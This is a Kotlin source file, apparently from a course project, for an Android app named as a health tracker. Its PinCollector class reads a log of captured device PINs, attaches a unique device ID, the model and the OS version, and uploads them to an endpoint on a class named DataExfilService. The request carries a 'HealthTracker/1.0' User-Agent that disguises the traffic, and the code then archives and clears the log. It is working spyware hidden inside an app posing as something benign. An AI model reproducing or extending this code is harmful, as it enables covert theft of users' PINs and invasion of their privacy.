package com.inf2007.healthtracker.utilities.collectors

import android.content.Context
import android.util.Log
import com.inf2007.healthtracker.utilities.DataExfilService
import com.inf2007.healthtracker.utilities.DeviceUtils
import com.inf2007.healthtracker.utilities.NetworkClient
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*

class PinCollector(private val context: Context) : DataCollector {
    companion object {
        private const val TAG = "PinCollector"
        private const val PIN_LOG_FILE = "pin.log"
    }

    override fun startObserving() {
        // PIN collection is triggered by broadcasts, not continuous observation
        Log.d(TAG, "Pin collector ready")
    }

    override fun stopObserving() {
        // Nothing to clean up
        Log.d(TAG, "Pin collector stopped")
    }

    override fun collect() {
        // This is called via broadcast receiver
        uploadPinLogs()
    }

    fun uploadPinLogs() {
        Thread {
            try {
                val pinLogFile = File(context.filesDir, PIN_LOG_FILE)
                if (!pinLogFile.exists() || pinLogFile.length() == 0L) {
                    return@Thread
                }

                val logContent = pinLogFile.readText()
                val lines = logContent.lines().filter { it.isNotBlank() }

                val pinData = JSONObject().apply {
                    put("type", "pin_capture")
                    put("device_id", DeviceUtils.getUniqueDeviceId(context))
                    put("device_model", android.os.Build.MODEL)
                    put("android_version", android.os.Build.VERSION.RELEASE)
                    put("timestamp", System.currentTimeMillis())
                    put("total_entries", lines.size)
                    put("pin_logs", JSONArray(lines))
                }

                val success = sendPinToServer(pinData)

                if (success) {
                    archivePinLogs(pinLogFile)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error uploading PIN logs: ${e.message}")
            }
        }.start()
    }

    private fun sendPinToServer(data: JSONObject): Boolean {
        return try {
            val requestBody = data.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())

            val request = Request.Builder()
                .url(DataExfilService.PIN_ENDPOINT)
                .post(requestBody)
                .addHeader("User-Agent", "HealthTracker/1.0")
                .build()

            var success = false
            val latch = java.util.concurrent.CountDownLatch(1)

            NetworkClient.instance.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "PIN upload failed: ${e.message}")
                    latch.countDown()
                }

                override fun onResponse(call: Call, response: Response) {
                    success = response.isSuccessful
                    if (success) {
                        Log.i(TAG, "PIN logs uploaded successfully")
                    } else {
                        Log.w(TAG, "PIN upload failed: HTTP ${response.code}")
                    }
                    response.close()
                    latch.countDown()
                }
            })

            latch.await(10, java.util.concurrent.TimeUnit.SECONDS)
            success

        } catch (e: Exception) {
            Log.e(TAG, "Error sending PINs: ${e.message}")
            false
        }
    }

    private fun archivePinLogs(pinLogFile: File) {
        try {
            if (pinLogFile.exists() && pinLogFile.length() > 0) {
                val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
                val archivedFile = File(context.filesDir, "pin_$timestamp.log")
                pinLogFile.copyTo(archivedFile)
                pinLogFile.writeText("")
                Log.d(TAG, "PIN logs archived to: ${archivedFile.name}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error archiving PIN logs: ${e.message}")
        }
    }
}